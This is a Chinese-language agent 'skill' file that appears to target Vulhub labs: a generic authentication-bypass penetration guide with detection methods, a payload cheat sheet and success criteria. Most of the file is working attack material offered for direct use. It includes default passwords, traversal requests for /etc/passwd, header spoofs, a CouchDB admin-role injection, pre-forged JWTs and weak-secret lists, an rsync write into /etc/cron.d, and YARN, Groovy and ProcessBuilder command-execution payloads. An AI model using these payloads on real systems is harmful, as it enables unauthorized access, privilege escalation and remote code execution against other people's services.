---
name: vulhub-auth-bypass
description: auth-bypass 类型漏洞的通用抽象探测与利用方案
version: 1.0
---

# AUTH-BYPASS 抽象化通用渗透与利用指南

## [1] 通用探测思路 (Detection Methodology)

认证绕过漏洞的核心在于**身份验证逻辑的缺失或缺陷**。攻击者应系统性地探测以下关键路径和逻辑点：

1.  **默认与弱凭证**：探测管理后台、API接口、服务端口（如SSH、数据库、管理控制台）是否存在未修改的默认或弱口令。这是最直接、最高效的入口。
2.  **未受保护的端点**：寻找无需认证即可访问的敏感API、管理页面、调试接口或数据导出/导入功能。常见于 `/api/`, `/admin/`, `/manager/`, `/debug/`, `/setup/`, `/export` 等路径。
3.  **逻辑缺陷探测**：
    *   **路径/参数遍历**：在URL路径或参数中尝试 `..`, `./`, `;`, `%0a`, `%0d`, `%u002e` 等编码，尝试绕过路径匹配或权限检查。
    *   **请求头操纵**：重点测试 `Authorization`, `User-Agent`, `X-Forwarded-For`, `X-Original-URL`, `X-Rewrite-URL` 以及应用特定的头部（如 `x-middleware-subrequest`）。
    *   **会话/令牌伪造**：当应用使用JWT、Cookie或自定义令牌时，检查其密钥是否为默认值或空值。尝试使用已知弱密钥（如 `secret`, `changeme`）签名伪造令牌。
    *   **状态覆盖**：寻找可以重置应用状态（如安装完成状态 `setupComplete=false`）、覆盖用户属性（如 `roles`）或操纵权限标志（如 `public=true`）的参数。
    *   **认证流程旁路**：尝试在认证过程中发送非预期消息（如 `MSG_USERAUTH_SUCCESS`）或利用条件竞争、缓存机制缺陷。
4.  **服务暴露与配置错误**：扫描开放的非Web服务端口（如 `873`(rsync), `6800`(scrapyd), `8088`(YARN)），检查其是否配置了访问控制。

## [2] 经典漏洞原型与 Payload 字典 (Cheat Sheet)

以下Payload已剥离具体CVE编号，按利用场景分类，可直接用于探测和利用。

### 默认/弱凭证
```bash
# 系统/服务登录
用户名: weblogic, 密码: Oracle@123
用户名: tomcat, 密码: tomcat
用户名: root, 密码: (空或任意错误密码，用于特定认证缺陷)
# SSH枚举有效用户
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null <user>@<target_ip> -p<port>
```

### 路径/参数遍历与规范化绕过
```http
# 目录遍历访问受限资源
GET /hello/file.jsp?path=/etc/passwd
GET /hello/file.jsp?path=./config/config.xml
GET /setup/setup-/%u002e%u002e/%u002e%u002e/user-create.jsp
GET /lua/find_prefs.lua?<traversal_payload>
```
```http
# 利用路径规范化缺陷
GET /./admin
GET /xxx/..;/admin/
GET /admin/%0atest
GET /admin/%0dtest
```

### 请求头操纵
```http
# 伪造内部服务身份
User-Agent: Nacos-Server
# 绕过中间件或权限检查
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
# 摘要认证空密码绕过
Authorization: Digest username=admin
```

### 参数/状态覆盖
```http
# 覆盖权限属性 (JSON中利用重复键)
PUT /_users/org.couchdb.user:attacker HTTP/1.1
{"type":"user","name":"attacker","roles":["_admin"],"roles":[],"password":"attacker"}
```
```http
# 强制公开私有API数据
GET /api/index.php/v1/config/application?public=true
# 重置应用安装状态
GET /server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false
```

### 会话/令牌伪造 (JWT)
```http
# 使用已知弱密钥签名的JWT
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoyOTg2MzQ2MjY3fQ.LJDvEy5zvSEpA_C6pnK3JJFkUKGq9eEi8T2wdum3R_s
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX25hbWUiOiJhZG1pbiIsInVzZXJfaWQiOiItMzA6YWRtaW4iLCJleHAiOjk3Mzk1MjM0ODN9.mnafQi6x9nlMz1OcPQu4xAyiq91Ig5tUFhGsktNXKqg
```
```python
# 常见默认/弱JWT密钥
SECRET_KEYS = [
    '\\x02\\x01thisismyscretkey\\x01\\x02\\\\e\\\\y\\\\y\\\\h',
    'CHANGE_ME_TO_A_COMPLEX_RANDOM_SECRET',
    'thisISaSECRET_1234',
    'YOUR_OWN_RANDOM_GENERATED_SECRET_KEY',
    'TEST_NON_DEV_SECRET',
    'temporary_key',
    'FXQXbJtbCLxODc6tGci732pkH1cyf8Qg',
    ''  # 空密钥
]
```

### 服务暴露与未授权访问
```bash
# Rsync 未授权访问/文件上传下载
rsync rsync://<target_ip>:873/
rsync -av rsync://<target_ip>:873/src/etc/passwd ./
rsync -av shell rsync://<target_ip>:873/src/etc/cron.d/shell
```
```http
# 应用管理后台/API未授权访问
POST /webtools/control/ProgramExport/?USERNAME=&PASSWORD=&requirePasswordChange=Y HTTP/1.1
POST /webtools/control/forgotPassword/viewdatafile HTTP/1.1
GET /apisix/admin/migrate/export
POST /apisix/admin/migrate/import
GET /nacos/v1/auth/users?pageNo=1&pageSize=9
POST /nacos/v1/auth/users?username=attacker&password=attacker
```

### 代码/命令执行载荷
```http
# 通过API提交恶意任务 (YARN)
POST http://<target_ip>:8088/ws/v1/cluster/apps
{"am-container-spec": {"commands": {"command": "touch /tmp/success"}}, ...}
```
```http
# 表达式/脚本注入
POST /webtools/control/ProgramExport HTTP/1.1
groovyProgram=throw+new+Exception('id'.execute().text);
```
```http
# 参数注入导致RCE
POST /dataSetParam/verification;swagger-ui/ HTTP/1.1
{"validationRules":"function verification(data){a = new java.lang.ProcessBuilder(\\\"id\\\").start().getInputStream();...}"}
```

## [3] 变体与特殊绕过技巧 (Bypass & Tricky Variants)

1.  **空值/空参数绕过**：在认证逻辑中，尝试省略密码字段、提交空密码(`password=`)、或提交 `null` 值。某些逻辑错误会将空值视为“无需验证”或验证通过。
2.  **编码与双重编码**：当直接路径遍历被拦截时，尝试对特殊字符进行URL编码(`%2e%2e%2f`)、Unicode编码(`%u002e`)或双重编码(`%252e%252e%252f`)。
3.  **换行符截断**：在URL或参数中注入换行符(`%0a`, `%0d`)，可能破坏正则表达式匹配或解析逻辑，导致后续的路径或参数被忽略。
4.  **分号边界符**：在某些框架（如结合某些Java框架时）中，`;` 可能被用作路径参数的分隔符。在路径后添加 `;` 及任意字符串，可能使权限检查逻辑失效。
5.  **缓存/会话污染**：如果应用将认证信息（如用户角色）缓存在Redis等存储中，且键名可预测或可控，尝试直接写入或修改缓存数据，从而提升权限。
6.  **条件竞争与状态不一致**：利用系统在锁定账户、重置密码、初始化安装等状态转换瞬间的逻辑漏洞。例如，在账户被锁定后尝试用空密码登录。
7.  **协议级消息注入**：在诸如SSH、Telnet等协议握手或认证阶段，直接发送服务器期望在后续阶段才收到的成功认证消息，从而跳过正常流程。

## [4] 回显与成功判定基准 (Verification)

成功利用认证绕过漏洞的标志因目标而异，但以下为通用判定基准：

1.  **访问敏感信息**：
    *   **Web/API**：成功访问原本返回 `401 Unauthorized` 或 `403 Forbidden` 的管理员面板、用户列表、配置文件（如 `config.xml`、`SerializedSystemIni.dat`）、数据库连接信息等。
    *   **系统**：成功读取 `/etc/passwd`、`/etc/shadow`、`/proc/self/environ` 等敏感文件内容。
    *   **服务**：通过未授权API成功查询到系统用户、配置或执行SQL查询。

2.  **权限提升证据**：
    *   使用绕过手段成功创建新的管理员用户账户。
    *   会话Cookie或JWT令牌被成功伪造，并且使用该令牌可以以高权限用户（如 `admin`）身份执行操作。
    *   通过API成功提交并执行了任意命令或代码，并在响应中看到命令执行结果（如 `uid=0(root)`）或通过OOB通道（DNS/HTTP）收到回连。

3.  **状态改变确认**：
    *   成功将应用状态重置为“未安装”，并进入了安装向导页面。
    *   成功修改了其他用户的密码或资料。

4.  **间接证明**：
    *   对于用户名枚举类漏洞，通过对比有效用户和无效用户的服务器响应时间、错误信息差异来确认漏洞存在。
    *   通过未授权访问成功导出了完整的应用配置备份文件。

**核心原则**：成功的最终标志是能够执行**只有通过合法认证的高权限用户才能执行的操作**。因此，在验证时，应尝试进行一个具体的、有权限限制的操作（如添加用户、读取特定文件、执行命令），而不仅仅是访问一个页面。